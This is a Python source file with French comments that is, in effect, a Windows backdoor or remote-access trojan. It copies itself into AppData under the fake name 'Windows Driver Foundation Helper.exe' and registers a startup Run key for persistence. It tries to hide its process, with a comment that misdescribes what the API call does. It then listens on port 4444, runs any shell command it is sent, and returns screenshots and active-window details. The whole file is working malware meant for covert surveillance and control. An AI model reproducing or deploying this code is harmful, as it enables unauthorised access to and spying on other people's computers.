import socket
import subprocess as sp
import asyncio
import pyautogui
import os
import time
import struct
import win32gui
import win32process
import psutil
import winreg
import sys
import shutil
import ctypes
from ctypes import wintypes

# Configuration du serveur
host = "0.0.0.0"
port = 4444

# Chemin attendu du fichier exécutable (dans AppData\Roaming)
expected_path = os.path.join(os.getenv('APPDATA'), 'Windows Driver Foundation Helper.exe')

# Crée un socket TCP/IP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Fonction pour masquer le processus du gestionnaire des tâches
def hide_from_task_manager():
    try:
        ntdll = ctypes.WinDLL('ntdll')
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

        # Définir les constantes et structures nécessaires
        ProcessBreakOnTermination = 29
        
        # Récupérer l'identifiant du processus actuel
        current_pid = kernel32.GetCurrentProcessId()
        
        # Ouvrir le processus avec les droits nécessaires
        h_process = kernel32.OpenProcess(0x1F0FFF, False, current_pid)
        
        # Désactiver certaines fonctionnalités de suivi
        ntdll.NtSetInformationProcess(h_process, ProcessBreakOnTermination, 
                                      ctypes.byref(ctypes.c_ulong(1)), 
                                      ctypes.sizeof(ctypes.c_ulong))
        
        # Fermer le handle du processus
        kernel32.CloseHandle(h_process)
        print("[+] Processus masqué du gestionnaire des tâches")
    except Exception as e:
        print(f"[-] Erreur lors du masquage du processus : {e}")

# Fonction pour dupliquer le fichier .exe dans AppData/Roaming
def duplicate_to_appdata():
    try:
        current_exe_path = os.path.abspath(sys.argv[0])
        appdata_roaming_path = os.path.join(os.getenv('APPDATA'), 'Windows Driver Foundation Helper.exe')
        if not os.path.exists(appdata_roaming_path):
            shutil.copy(current_exe_path, appdata_roaming_path)
            print(f"[+] Script dupliqué dans {appdata_roaming_path}")
        return appdata_roaming_path
    except Exception as e:
        print(f"Erreur lors de la duplication du fichier : {e}")
        return None

# Fonction pour ajouter le script au démarrage via la clé de registre
def add_to_startup(exe_path):
    try:
        key_name = "WinHelper"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        print(f"Ajouté au démarrage : {exe_path}")
    except Exception as e:
        print(f"Erreur lors de l'ajout au démarrage : {e}")

# Fonction pour vérifier si le processus est déjà en cours d'exécution
def is_process_running(process_name):
    for proc in psutil.process_iter(attrs=['pid', 'name']):
        try:
            if process_name.lower() in proc.info['name'].lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False

# Fonction pour exécuter une commande système
async def execute_command(command):
    process = sp.Popen(command, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE, text=True)
    out, err = process.communicate()
    return out + err

# Fonction pour prendre une capture d'écran
def take_screenshot():
    ip = socket.gethostbyname(socket.gethostname())
    hostname = socket.gethostname()
    timestamp = time.strftime("%Y%m%d-%H%M%S", time.localtime()) + f"-{int(time.time() * 1000) % 1000}"
    filename = f"{ip}_{hostname}_{timestamp}.png"
    screenshot_path = os.path.join("C:/Users/Public/Downloads", filename)
    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_path)
    return screenshot_path, filename

# Fonction pour obtenir des informations sur la fenêtre active
def get_active_window_info():
    try:
        window = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(window)
        _, pid = win32process.GetWindowThreadProcessId(window)
        process = psutil.Process(pid)
        return f"Titre: {title}\nProcessus: {process.name()}\nPID: {pid}\nExécutable: {process.exe()}"
    except Exception as e:
        return f"Erreur lors de la récupération des informations: {str(e)}"

# Fonction pour gérer les commandes envoyées par le client
async def handle_client(conn):
    while True:
        try:
            command = conn.recv(1024).decode()
            if not command:
                break

            if command == "SCREENSHOT":
                screenshot_path, filename = take_screenshot()
                with open(screenshot_path, "rb") as file:
                    data = file.read()
                file_size = len(data)
                conn.sendall(struct.pack("!I", file_size))
                conn.sendall(filename.encode().ljust(100))
                conn.sendall(data)
            elif command == "GET_ACTIVE_WINDOW":
                info = get_active_window_info()
                conn.send(info.encode())
            else:
                result = await execute_command(command)
                conn.send(result.encode() if result else b"Commande executee sans resultat.\n")
        except Exception:
            break

    print("[-] Connexion fermée.")
    conn.close()

# Fonction principale
async def main():
    # Si le nom du fichier exécuté est client.exe, on ne démarre pas le serveur
    if os.path.basename(sys.argv[0]).lower() == "client.exe":
        print("[*] client.exe détecté. Duplication puis exécution de win_helper.exe...")

        appdata_exe_path = duplicate_to_appdata()
        if appdata_exe_path:
            # Exécution de la version win_helper.exe dans AppData
            sp.Popen([appdata_exe_path], stdout=sp.DEVNULL, stderr=sp.DEVNULL)
        sys.exit(0)

    # Sinon, on est déjà dans win_helper.exe, on continue l'exécution normale
    appdata_exe_path = expected_path

    # Masquer le processus du gestionnaire des tâches
    hide_from_task_manager()

    # Ajoute au démarrage
    add_to_startup(appdata_exe_path)

    # Configure et démarre le serveur socket
    try:
        s.bind((host, port))
        s.listen(5)
        print(f"[+] Serveur à l'écoute sur {host}:{port}")
    except OSError as e:
        print(f"Erreur lors de la configuration du serveur socket : {e}")
        return

    while True:
        try:
            conn, addr = s.accept()
            print(f"[+] Connexion établie avec {addr[0]}")
            await handle_client(conn)
        except Exception as e:
            print(f"Erreur lors de la gestion de la connexion : {e}")
            continue

# Lancer le programme
asyncio.run(main())